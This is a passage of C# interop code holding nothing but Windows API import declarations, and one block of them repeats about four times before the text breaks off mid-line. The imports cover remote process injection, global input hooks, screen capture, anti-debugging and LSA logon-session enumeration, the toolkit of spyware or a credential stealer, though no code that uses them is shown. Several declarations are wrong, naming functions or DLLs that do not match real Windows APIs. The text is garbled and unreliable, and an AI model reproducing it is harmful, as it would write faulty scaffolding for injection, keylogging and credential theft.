        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
